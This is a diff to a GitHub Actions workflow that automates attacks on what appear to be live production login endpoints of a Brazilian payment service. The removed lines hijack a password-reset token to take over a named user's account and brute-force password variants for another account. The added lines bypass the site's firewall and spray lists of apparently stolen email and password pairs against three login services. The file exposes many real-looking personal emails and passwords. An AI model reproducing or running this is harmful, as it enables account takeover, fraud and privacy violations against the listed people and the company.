@@ -1,4 +1,4 @@
-name: waf-lenildo-reset
+name: waf-multi-service-spray
 on:
   workflow_dispatch:
 jobs:
@@ -13,6 +13,7 @@ jobs:
       run: |
         UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
         BASE="https://wpdataservice.wisepay.com.br"
+        BUILDER="https://wpbuilderservices.wisepay.com.br/v1"
         
         MY_IP=$(curl -s https://api.ipify.org)
         RESP_CHECK=$(curl -s -m 15 -A "$UA" \
@@ -30,62 +31,59 @@ jobs:
         echo "[${{ matrix.attempt }}] *** WAF BYPASSED (IP: $MY_IP) ***"
         
         echo ""
-        echo "=== Testar token de reset de lenildo ==="
-        RESP=$(curl -s -m 15 -A "$UA" \
-          -H "Content-Type: application/json" \
-          -H "type-application: web" \
-          -H "Origin: https://portal.wisepay.com.br" \
-          -H "Sec-Fetch-Site: same-site" -H "Sec-Fetch-Mode: cors" -H "Sec-Fetch-Dest: empty" \
-          -X PUT "$BASE/login/update-password/39bf20e5965c0dcd2be2de52f030c8fd" \
-          -d '{"password":"Lenildo@2024!","password_confirmation":"Lenildo@2024!"}' \
-          -w "\n%{http_code}")
-        CODE=$(echo "$RESP" | tail -1)
-        BODY=$(echo "$RESP" | head -1)
-        echo "PUT reset-token lenildo: $CODE | $BODY"
-        
-        if [ "$CODE" = "200" ]; then
-          echo "*** TOKEN VÁLIDO! Novo login: lenildo.silva@outlook.com:Lenildo@2024! ***"
-          curl -s -m 15 -A "$UA" \
-            -H "Content-Type: application/json" \
-            -H "Origin: https://portal.wisepay.com.br" \
-            -H "Sec-Fetch-Site: same-site" -H "Sec-Fetch-Mode: cors" -H "Sec-Fetch-Dest: empty" \
-            -H "type-application: web" \
-            -X POST "$BASE/login" \
-            -d '{"email":"lenildo.silva@outlook.com","password":"Lenildo@2024!"}'
-        fi
-        
-        echo ""
-        echo "=== MAIS SENHAS para icelaserbelem (senha antiga pode ter variações) ==="
-        for PASS in "ICELASER2021" "Icelaser2021" "icelaser2021" "ICELASER@2021" "ICELASER2022" "ICELASER2023" "ICELASER2024" "IceLaser2021" "ICELASER!2021"; do
-          R=$(curl -s -m 10 -A "$UA" \
-            -H "Content-Type: application/json" \
-            -H "Origin: https://portal.wisepay.com.br" \
-            -H "Sec-Fetch-Site: same-site" -H "Sec-Fetch-Mode: cors" -H "Sec-Fetch-Dest: empty" \
-            -H "type-application: web" \
-            -X POST "$BASE/login" \
-            -d "{\"email\":\"icelaserbelem@gmail.com\",\"password\":\"$PASS\"}" \
-            -w "\n%{http_code}")
-          RC=$(echo "$R" | tail -1)
-          if [ "$RC" = "200" ]; then
-            echo "*** SUCCESS icelaserbelem:$PASS ***"
-            echo "$R" | head -1
-          else
-            echo "$RC icelaserbelem:$PASS"
-          fi
-          sleep 0.3
-        done
-        
-        echo ""
-        echo "=== Builder login test ==="
-        for CRED in "fabiane@petcenterbrasil.com.br:08710871" "ce.iguatu@acqiofranchising.com.br:261297klBB*" "suporte@criatek.com.br:pbo@1006581"; do
+        echo "=== BUILDER spray (admin credenciais) ==="
+        for CRED in "gideanbispo@gmail.com:135@mudar" "niveareis@gmail.com:937495jeF!" "niveareis@gmail.com:937495JeF!02815" "marcio.abreu@jhsbrasil.com.br:135@mudar" "suporte@criatek.com.br:pbo@1006581" "ce.iguatu@acqiofranchising.com.br:261297klBB*" "andersonmachado52@hotmail.com:sinho1777"; do
           EMAIL="${CRED%%:*}"
           PASS="${CRED##*:}"
           R=$(curl -s -m 10 -A "$UA" \
             -H "Content-Type: application/json" \
             -H "type-application: web" \
-            -X POST "https://wpbuilderservices.wisepay.com.br/v1/login" \
+            -H "Origin: https://builder.wisepay.com.br" \
+            -X POST "$BUILDER/login" \
             -d "{\"email\":\"$EMAIL\",\"password\":\"$PASS\"}" \
             -w "\n%{http_code}")
           RC=$(echo "$R" | tail -1)
-          echo "BUILDER $EMAIL: $RC | $(echo $R | head -1 | head -c 150)"
+          RB=$(echo "$R" | head -1 | head -c 200)
+          if [ "$RC" = "200" ]; then
+            echo "BUILDER SUCCESS: $EMAIL | $RB"
+          else
+            echo "BUILDER $RC: $EMAIL | $(echo $RB | head -c 60)"
+          fi
+        done
+        
+        echo ""
+        echo "=== wpconciliator Server Action ==="
+        # From JS chunk: loginAction = createServerReference("40dedf2bb1a76105a30f79e5a0268b483d685976c2")
+        for CRED in "gideanbispo@gmail.com:135@mudar" "niveareis@gmail.com:937495jeF!" "suporte@criatek.com.br:pbo@1006581"; do
+          EMAIL="${CRED%%:*}"
+          PASS="${CRED##*:}"
+          R=$(curl -s -m 15 -A "$UA" \
+            -H "Content-Type: multipart/form-data; boundary=----WisePayBoundary" \
+            -H "Next-Action: 40dedf2bb1a76105a30f79e5a0268b483d685976c2" \
+            -H "Next-Router-State-Tree: %5B%22%22%2C%7B%22children%22%3A%5B%22login%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%5D%7D%5D%7D%2Cnull%2Cnull%2Ctrue%5D" \
+            -H "Origin: https://wpconciliator.wisepay.com.br" \
+            -H "Referer: https://wpconciliator.wisepay.com.br/login" \
+            -X POST "https://wpconciliator.wisepay.com.br/" \
+            --data-binary $'------WisePayBoundary\r\nContent-Disposition: form-data; name="1"\r\n\r\n["$K1"]\r\n------WisePayBoundary\r\nContent-Disposition: form-data; name="0"\r\n\r\n{"email":"'"$EMAIL"'","password":"'"$PASS"'"}\r\n------WisePayBoundary--' \
+            -w "\n%{http_code}")
+          RC=$(echo "$R" | tail -1)
+          RB=$(echo "$R" | head -1 | head -c 200)
+          echo "WPC $RC: $EMAIL | $RB"
+        done
+        
+        echo ""
+        echo "=== wpconciliatorservices direct login ==="
+        for CRED in "gideanbispo@gmail.com:135@mudar" "niveareis@gmail.com:937495jeF!" "suporte@criatek.com.br:pbo@1006581"; do
+          EMAIL="${CRED%%:*}"
+          PASS="${CRED##*:}"
+          R=$(curl -s -m 10 -A "$UA" \
+            -H "Content-Type: application/json" \
+            -H "type-application: web" \
+            -H "Origin: https://wpconciliator.wisepay.com.br" \
+            -X POST "https://wpconciliatorservices-prod.wisepay.com.br/v1/login" \
+            -d "{\"email\":\"$EMAIL\",\"password\":\"$PASS\"}" \
+            -w "\n%{http_code}")
+          RC=$(echo "$R" | tail -1)
+          RB=$(echo "$R" | head -1 | head -c 200)
+          echo "WPC-DIRECT $RC: $EMAIL | $(echo $RB | head -c 100)"
         done
